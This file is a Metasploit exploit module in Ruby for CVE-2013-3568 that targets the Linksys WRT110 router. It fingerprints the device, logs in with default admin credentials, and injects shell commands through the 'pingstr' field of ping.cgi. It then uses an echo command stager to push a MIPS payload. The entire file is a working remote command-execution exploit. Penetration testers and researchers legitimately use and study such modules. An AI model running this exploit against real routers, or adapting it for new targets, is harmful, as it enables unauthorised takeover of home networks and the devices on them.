##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStagerEcho

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Linksys WRT110 Remote Command Execution',
      'Description' => %q{
        The Linksys WRT110 consumer router is vulnerable to a command injection
        exploit in the ping field of the web interface.
      },
      'Author'      =>
        [
          'Craig Young', # Vulnerability discovery
          'joev', # msf module
          'juan vazquez' # module help + echo cmd stager
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          ['CVE', '2013-3568'],
          ['BID', '61151'],
          ['URL', 'http://seclists.org/bugtraq/2013/Jul/78']
        ],
      'DisclosureDate' => 'Jul 12 2013',
      'Privileged'     => true,
      'Platform'       => ['linux'],
      'Arch'           => ARCH_MIPSLE,
      'Targets'        =>
        [
            ['Linux mipsel Payload', { } ]
        ],
      'DefaultTarget'  => 0,
      ))

    register_options([
      OptString.new('USERNAME', [ true, 'Valid router administrator username', 'admin']),
      OptString.new('PASSWORD', [ false, 'Password to login with', 'admin']),
      OptAddress.new('RHOST', [true, 'The address of the router', '192.168.1.1']),
      OptInt.new('TIMEOUT', [false, 'The timeout to use in every request', 20])
    ], self.class)

  end

  def check
    begin
      res = send_request_cgi({
        'uri' => '/HNAP1/'
      })
    rescue ::Rex::ConnectionError
      return Exploit::CheckCode::Safe
    end

    if res and res.code == 200 and res.body =~ /<ModelName>WRT110<\/ModelName>/
      return Exploit::CheckCode::Vulnerable
    end

    return Exploit::CheckCode::Safe
  end

  def exploit
    test_login!

    execute_cmdstager
  end

  # Sends an HTTP request with authorization header to the router
  # Raises an exception unless the login is successful
  def test_login!
    print_status("#{rhost}:#{rport} - Trying to login with #{user}:#{pass}")

    res = send_auth_request_cgi({
      'uri' => '/',
      'method' => 'GET'
    })

    if not res or res.code == 401 or res.code == 404
      fail_with(Failure::NoAccess, "#{rhost}:#{rport} - Could not login with #{user}:#{pass}")
    else
      print_good("#{rhost}:#{rport} - Successful login #{user}:#{pass}")
    end
  end

  # Run the command on the router
  def execute_command(cmd, opts)
    send_auth_request_cgi({
      'uri' => '/ping.cgi',
      'method' => 'POST',
      'vars_post' => {
         'pingstr' => '& ' + cmd
      }
    })

    Rex.sleep(1) # Give the device a second
  end

  # Helper methods
  def user; datastore['USERNAME']; end
  def pass; datastore['PASSWORD'] || ''; end

  def send_auth_request_cgi(opts={}, timeout=nil)
    timeout ||= datastore['TIMEOUT']
    opts.merge!('authorization' => basic_auth(user, pass))
    begin
      send_request_cgi(opts, timeout)
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unknown, "#{rhost}:#{rport} - Could not connect to the webservice")
    end
  end
end